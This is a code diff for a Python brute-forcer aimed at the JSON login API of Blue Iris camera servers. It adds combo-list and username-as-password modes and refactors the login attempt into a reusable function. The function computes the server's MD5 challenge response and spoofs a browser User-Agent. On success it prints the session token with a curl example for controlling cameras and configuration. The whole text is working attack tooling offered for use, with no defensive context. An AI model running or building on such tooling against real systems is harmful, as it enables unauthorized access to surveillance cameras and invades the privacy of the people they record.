@@ -22,11 +22,26 @@ def load_wordlist(path):
         with open(path) as f:
             return [line.strip() for line in f if line.strip()]
 
+def load_combo(path):
+    if not os.path.exists(path):
+        print(f"[-] Combo file not found: {path}")
+        sys.exit(1)
+    combos = []
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if line and ':' in line:
+                user, pwd = line.split(':', 1)
+                combos.append((user.strip(), pwd.strip()))
+    return combos
+
 def main():
     parser = argparse.ArgumentParser(description="Blue Iris Modern JSON Scanner & Brute-Forcer (c0nfigur3/BI-scanner)")
     parser.add_argument("-H", "--host", required=True, help="Target URL (e.g. http://REDACTED:81)")
     parser.add_argument("-u", "--users", default="users.txt", help="Username list (default: users.txt)")
-    parser.add_argument("-p", "--passwords", default="passwords.txt", help="Password list — supports .txt or .gz (e.g. /usr/share/wordlists/rockyou.txt.gz)")
+    parser.add_argument("-p", "--passwords", default="passwords.txt", help="Password list — supports .txt or .gz")
+    parser.add_argument("-c", "--combo", help="Combo list (username:password per line) — dynamic brute-force")
+    parser.add_argument("--try-user-as-pass", action="store_true", help="Dynamically try each username as its own password")
     parser.add_argument("-d", "--delay", type=int, default=2, help="Delay between attempts in seconds (default: 2)")
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     args = parser.parse_args()
@@ -40,13 +55,31 @@ def main():
         data = r.json()
         if data.get("result") == "success":
             print("[+] SUCCESS! Anonymous access is permitted")
-            print("[+] Full dump example: curl -X POST -d '{\"cmd\":\"system\"}' " + f"{base_url}/json")
             sys.exit(0)
     except:
         pass
     print("[-] Anonymous access is not permitted")
 
-    # Load wordlists
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+
+    # Dynamic combo mode (takes precedence)
+    if args.combo:
+        print(f"[+] Dynamic combo mode — loading {args.combo}")
+        combos = load_combo(args.combo)
+        print(f"[+] Brute forcing {len(combos):,} username:password pairs...\n")
+        for user, pwd in combos:
+            if args.verbose:
+                print(f"[*] Trying {user}:{pwd}")
+            else:
+                print(f"\r[*] Trying {user}:{pwd[:20]:20}", end="", flush=True)
+            if brute_attempt(session, base_url, user, pwd, args.verbose):
+                sys.exit(0)
+            time.sleep(args.delay)
+        print("\n[-] No luck with combo list.")
+        sys.exit(1)
+
+    # Regular mode (existing -u / -p) + optional --try-user-as-pass
     try:
         with open(args.users) as f:
             users = [line.strip() for line in f if line.strip()]
@@ -55,48 +88,53 @@ def main():
         print("[!] users.txt not found — using default 'admin'")
 
     passwords = load_wordlist(args.passwords)
-
     print(f"[+] Brute forcing {len(users)} user(s) × {len(passwords):,} password(s)...\n")
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
-
     for user in users:
+        # Optional dynamic user-as-pass
+        if args.try_user_as_pass:
+            if args.verbose:
+                print(f"[*] Trying {user}:{user}  (user-as-pass)")
+            else:
+                print(f"\r[*] Trying {user}:{user}  (user-as-pass)", end="", flush=True)
+            if brute_attempt(session, base_url, user, user, args.verbose):
+                sys.exit(0)
+            time.sleep(args.delay)
+
         for pwd in passwords:
             if args.verbose:
                 print(f"[*] Trying {user}:{pwd}")
+            else:
+                print(f"\r[*] Trying {user}:{pwd[:20]:20}", end="", flush=True)
+            if brute_attempt(session, base_url, user, pwd, args.verbose):
+                sys.exit(0)
+            time.sleep(args.delay)
 
-            # Step 1: Get session ID
-            try:
-                r = session.post(f"{base_url}/json", json={"cmd": "login"}, timeout=10)
-                resp = r.json()
-                if resp.get("result") != "success":
-                    continue
-                sess_id = resp["session"]
-            except:
-                continue
+    print("\n[-] No luck with current wordlists.")
+    sys.exit(1)
 
-            # Step 2: Correct Blue Iris MD5 = username:session:password
-            response_hash = md5(f"{user}:{sess_id}:{pwd}")
+def brute_attempt(session, base_url, user, pwd, verbose):
+    try:
+        r = session.post(f"{base_url}/json", json={"cmd": "login"}, timeout=10)
+        resp = r.json()
+        if resp.get("result") != "success":
+            return False
+        sess_id = resp["session"]
 
-            # Step 3: Send final login
-            payload = {"cmd": "login", "session": sess_id, "response": response_hash}
-            r = session.post(f"{base_url}/json", json=payload, timeout=10)
+        response_hash = md5(f"{user}:{sess_id}:{pwd}")
+        payload = {"cmd": "login", "session": sess_id, "response": response_hash}
+        r = session.post(f"{base_url}/json", json=payload, timeout=10)
 
-            try:
-                resp = r.json()
-                if resp.get("result") == "success":
-                    print(f"\n[+] SUCCESS - {user}:{pwd}")
-                    print(f"    Session token: {sess_id}")
-                    print(f"    Full session ready for any JSON command (cameras, alerts, config, etc.)")
-                    print(f"\n[+] Example: curl -X POST {base_url}/json -d '{{\"cmd\":\"system\",\"session\":\"{sess_id}\"}}'")
-                    sys.exit(0)
-            except:
-                pass
-
-            time.sleep(args.delay)  # Prevent IP ban
-
-    print("[-] No luck with current wordlists. Try a larger one or expand users.txt.")
+        resp = r.json()
+        if resp.get("result") == "success":
+            print(f"\n\n[+] SUCCESS - {user}:{pwd}")
+            print(f"    Session token: {sess_id}")
+            print(f"    Use this token for any JSON command (cameras, alerts, config, etc.)")
+            print(f"\n[+] Example: curl -X POST {base_url}/json -d '{{\"cmd\":\"system\",\"session\":\"{sess_id}\"}}'")
+            return True
+    except:
+        pass
+    return False
 
 if __name__ == "__main__":
     main()
